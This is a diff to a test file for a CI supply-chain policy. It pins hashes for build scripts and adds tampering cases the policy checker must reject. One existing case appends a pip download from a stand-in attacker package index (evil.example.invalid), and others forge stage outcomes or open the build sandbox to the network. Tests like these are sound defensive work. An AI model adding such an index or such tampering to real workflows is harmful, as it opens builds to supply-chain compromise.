@@ -1,3 +1,4 @@
+import { createHash } from 'node:crypto';
 import { readFileSync } from 'node:fs';
 import { dump as dumpYaml, load as parseYaml } from 'js-yaml';
 import { describe, expect, it } from 'vitest';
@@ -5,6 +6,7 @@ import {
   ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST,
   ATOMISTIC_BOOTSTRAP_BASE_IMAGE,
   ATOMISTIC_BOOTSTRAP_NODE_VERSION,
+  ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256,
   ATOMISTIC_BOOTSTRAP_PYPI_INDEX,
   ATOMISTIC_BOOTSTRAP_PYTORCH_INDEX,
   ATOMISTIC_BOOTSTRAP_WORKFLOW_PATH,
@@ -13,6 +15,11 @@ import {
   inspectDockerignoreSource,
   inspectWorkflowSource,
   PINNED_DOCKERFILE_FRONTEND,
+  PYTHON_HOSTLIST_BUILD_LOCK_SHA256,
+  PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256,
+  PYTHON_HOSTLIST_SDIST_SHA256,
+  PYTHON_HOSTLIST_SDIST_URL,
+  PYTHON_HOSTLIST_VERIFIER_SHA256,
   SENTINEL_EVALUATION_WORKFLOW_PATH,
   SENTINEL_REPORT_WORKFLOW_PATH,
 } from './workflow-policy.mjs';
@@ -32,6 +39,22 @@ const sentinelEvaluationSource = readFileSync(
 const sentinelReportSource = readFileSync(
   new URL('../.github/workflows/sentinel-report.yml', import.meta.url),
   'utf8',
+);
+const pythonHostlistBuildLockSource = readFileSync(
+  new URL('../atomistic/locks/python-hostlist-build.requirements.lock', import.meta.url),
+);
+const pythonHostlistBuildScriptSource = readFileSync(
+  new URL('./atomistic/build_python_hostlist_wheel.sh', import.meta.url),
+);
+const pythonHostlistVerifierSource = readFileSync(
+  new URL('./atomistic/verify_derived_wheel.py', import.meta.url),
+);
+const atomisticResolveLockSource = readFileSync(
+  new URL('./atomistic/resolve_lock.py', import.meta.url),
+  'utf8',
+);
+const bootstrapOutcomeSource = readFileSync(
+  new URL('./atomistic/write_bootstrap_outcome.py', import.meta.url),
 );
 const sentinelEvaluationWorkflow = parseYaml(sentinelEvaluationSource);
 const sentinelReportWorkflow = parseYaml(sentinelReportSource);
@@ -213,6 +236,18 @@ describe('atomistic bootstrap supply-chain policy', () => {
     expect(ATOMISTIC_BOOTSTRAP_NODE_VERSION).toBe('24.16.0');
     expect(ATOMISTIC_BOOTSTRAP_BASE_IMAGE).toMatch(/^python:3\.12\.13-slim-bookworm@sha256:[0-9a-f]{64}$/);
     expect(ATOMISTIC_BOOTSTRAP_BASE_AMD64_DIGEST).toMatch(/^sha256:[0-9a-f]{64}$/);
+    expect(PYTHON_HOSTLIST_SDIST_URL).toMatch(/^https:\/\/files\.pythonhosted\.org\//);
+    expect(PYTHON_HOSTLIST_SDIST_SHA256).toMatch(/^[0-9a-f]{64}$/);
+    expect(createHash('sha256').update(pythonHostlistBuildLockSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_LOCK_SHA256);
+    expect(createHash('sha256').update(pythonHostlistBuildScriptSource).digest('hex')).toBe(PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256);
+    expect(createHash('sha256').update(pythonHostlistVerifierSource).digest('hex')).toBe(PYTHON_HOSTLIST_VERIFIER_SHA256);
+    expect(createHash('sha256').update(bootstrapOutcomeSource).digest('hex')).toBe(ATOMISTIC_BOOTSTRAP_OUTCOME_SCRIPT_SHA256);
+    expect(atomisticResolveLockSource).toContain(
+      `PYTHON_HOSTLIST_BUILD_TOOL_LOCK_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_LOCK_SHA256}"`,
+    );
+    expect(atomisticResolveLockSource).toContain(
+      `PYTHON_HOSTLIST_BUILD_SCRIPT_DIGEST = "sha256:${PYTHON_HOSTLIST_BUILD_SCRIPT_SHA256}"`,
+    );
   });
 
   it('rejects trigger, main guard, runtime, architecture and model-isolation drift', () => {
@@ -266,6 +301,38 @@ describe('atomistic bootstrap supply-chain policy', () => {
         const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
         step.run += '\npython -m pip download --extra-index-url https://evil.example.invalid/simple torch\n';
       }],
+      ['cached dependency downloads', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace('--no-cache-dir', '--cache-dir=/tmp/pip-cache');
+      }],
+      ['expanded dependency tmpfs', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace('size=1g,mode=1777', 'size=8g,mode=1777');
+      }],
+      ['python-hostlist sdist drift', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace(PYTHON_HOSTLIST_SDIST_SHA256, 'f'.repeat(64));
+      }],
+      ['networked source builder', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        const start = step.run.indexOf('for derived_output in');
+        const suffix = step.run.slice(start).replace('--network=none', '--network=bridge');
+        step.run = step.run.slice(0, start) + suffix;
+      }],
+      ['workspace mounted into source builder', (workflow) => {
+        const step = namedStep(workflow, 'Download one fresh resolved wheelhouse in the online phase');
+        step.run = step.run.replace(
+          '--mount "type=bind,src=$SOURCE_BUILD_INPUTS,dst=/inputs,readonly"',
+          '--mount "type=bind,src=$GITHUB_WORKSPACE,dst=/repo,readonly"',
+        );
+      }],
+      ['derived provenance omitted from offline resolver', (workflow) => {
+        const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
+        step.run = step.run.replace(
+          'derived_arguments=(--derived-wheel-manifest /manifests/python-hostlist.derived-wheel.manifest.json)',
+          'derived_arguments=()',
+        );
+      }],
       ['networked lock resolution', (workflow) => {
         const step = namedStep(workflow, 'Resolve an exact lock from the offline wheelhouse');
         step.run = step.run.replace('--network=none', '--network=bridge');
@@ -310,6 +377,21 @@ describe('atomistic bootstrap supply-chain policy', () => {
       ['checkpoint publication', (workflow) => {
         const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
         step.run += '\ninstall -m 0444 "$CACHE_ROOT/$CHECKPOINT_CACHE_PATH" "$PUBLISH_DIR/checkpoint.model"\n';
+      }],
+      ['forged outcome stage', (workflow) => {
+        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
+        step.env.STAGE_INFERENCE = '${{ steps.build.outcome }}';
+      }],
+      ['forged intermediate outcome mapping', (workflow) => {
+        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
+        step.run = step.run.replace(
+          '--stage "resolve=$STAGE_RESOLVE"',
+          '--stage "resolve=$STAGE_FREEZE"',
+        );
+      }],
+      ['outcome manifest omitted', (workflow) => {
+        const step = namedStep(workflow, 'Stage only non-promotional bootstrap outputs');
+        step.run = step.run.replace('python -B scripts/atomistic/write_bootstrap_outcome.py', 'true');
       }],
       ['metrics side step', (workflow) => {
         workflow.jobs.bootstrap.steps.splice(-1, 0, { name: 'Compute metrics', shell: 'bash', run: 'node compute-metrics.mjs' });
